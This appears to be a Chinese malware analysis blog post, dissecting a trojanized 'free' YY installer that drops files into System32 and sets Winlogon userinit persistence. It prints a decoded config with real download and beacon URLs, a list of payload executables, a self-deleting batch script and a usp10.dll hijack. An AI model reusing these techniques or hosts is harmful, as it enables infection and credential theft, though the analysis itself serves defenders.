
# YY 神马免费版

> 原文：[`www.pediy.com/kssd/pediy12/140895.html`](https://www.pediy.com/kssd/pediy12/140895.html)

其实吧，身在**，最不可信的用词莫过于“免费”了。我只是想找个东西分析一下 `YY` 的登录协议自己写个多开去捧捧某人的频道而已。

下载下来是一个 `RAR`，解压缩。

然后是一个 `EXE`，拖进 `OD`，这个一个 `NSIS` 安装程序，拖进 `Universal Extractor` 解包。

然后是 2 个 `EXE`，一个是同名 `EXE`，另一个是 `kk1.exe`，顿时我就黑化了……

把 `kk1` 拖进 `OD`，看起来像 `ASM` 的杰作。然后例行释放了 `UpdateUsp.dll`，`usp10.dll`，`SystemUpdate.exe`，当然肯定是在 `System32` 里面。话说写教程的时候按错键了，等下又要重装 `VM` 了。唉……

然后在写 `SystemUpdate.exe` 的时候从 `kk1.exe` 的尾部解码了一个神奇的字符串：

```
OOOOOOhttp://119.147.134.164:1234/yy.txt|C:\\WINDOWS\\boot.ini
CCCCCChttp://174.139.107.242:1234/get.asp
VVVVVVkk1
```

打开一个 `IE`：

`http://119.147.134.164:1234/yy.txt` 内容：

```
http://119.147.134.164:4321/yym.exe
http://119.147.134.164:4321/qqm.exe
http://119.147.134.164:4321/dnf1.exe
http://119.147.134.164:4321/cq1.exe
http://119.147.134.164:4321/gl1.exe
http://119.147.134.164:4321/wow1.exe
http://119.147.134.164:4321/tl2.exe
http://119.147.134.164:4321/qqsg.exe
http://119.147.134.164:4321/qqhx1.exe
http://119.147.134.164:4321/zx2.exe
http://119.147.134.164:4321/gj.exe
http://119.147.134.164:4321/gr.exe
```

真的没什么好说的……

然后我们来看 `SystemUpdate.exe`

在 `HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogo` 下面的：`C:\\WINDOWS\\system32\\userinit.exe,C:\\WINDOWS\\Tasks\\conime.exe`

其次把自己复制到 `%windir%/tasks/conime.exe` 然后执行

然后创建一个 `dll.bat`，内容如下：

```
@echo off
@echo asdfhdsafjkahlsdjfhlk>>3596799a1543bc9f.aqq
@echo asdfhdsafjkahlsdjfhlk>>3596799a1543bc9f.aqq
@echo asdfhdsafjkahlsdjfhlk>>3596799a1543bc9f.aqq
@echo asdfhdsafjkahlsdjfhlk>>3596799a1543bc9f.aqq
@echo asdfhdsafjkahlsdjfhlk>>3596799a1543bc9f.aqq
@echo asdfhdsafjkahlsdjfhlk>>3596799a1543bc9f.aqq
@echo asdfhdsafjkahlsdjfhlk>>3596799a1543bc9f.aqq
@echo asdfhdsafjkahlsdjfhlk>>3596799a1543bc9f.aqq
@echo asdfhdsafjkahlsdjfhlk>>3596799a1543bc9f.aqq
@echo asdfhdsafjkahlsdjfhlk>>3596799a1543bc9f.aqq
@del 3596799a1543bc9f.aqq
@del "C:\\SystemUpdate.exe"
@del dll.bat
@exit
```

然后真的 `Exit` 了，当然这只是发现自己不是在 `C:\\WINDOWS\\Tasks` 里面的时候执行的部分。

然后来看是的时候得流程：

果断的读取附加字节。

```
OOOOOOhttp://119.147.134.164:1234/yy.txt|C:\\WINDOWS\\boot.ini       =      UrlDownloadFileA http://119.147.134.164:1234/yy.txt->C:\\WINDOWS\\boot.ini
```

然后依次下载里面的那些 `exe`，然后删除 `boot.ini`

`CCCCCChttp://174.139.107.242:1234/get.asp` `VVVVVVkk1` 的用法：

`http://174.139.107.242:1234/get.asp?mac=00-0c-29-8a-1c-ce&ver=kk1&pnum=29`

这么明了的字符串就不解释了吧。

提交之后就返回了五个字符 `addok` 如果最后 `pnum` 不是 `29` 的话，那就是 `updateok`

然后休息一会儿继续上面 2 步

下面来看 `UpdateUsp.dll`，说真的，我不相信一个几十 `K` 的 `exe` 能释放出一个几百 `K` 的 `dll`，所以它的源文件名告诉我这个是原始的 `usp10.dll`。

然后是释放出来的 `6.5K` 的 `usp10.dll` (`NewDownload.dll`):

首先看看，是 `360` 娘加载了我么？是的话就一起死吧！

然后是 `Explorer` 加载了我么？不是的话，那就算了吧。是的话就建一个线程。

线程：

使用 `HKLM\\Software\\360Safe\\menuext\\LiveUpdate360` 下的 `Application` 键值查找 `SoftMgr.exe`，但并没有感染。

然后执行 `SystemUpdate.exe` 和 `360` 的 `SoftMgr.exe`
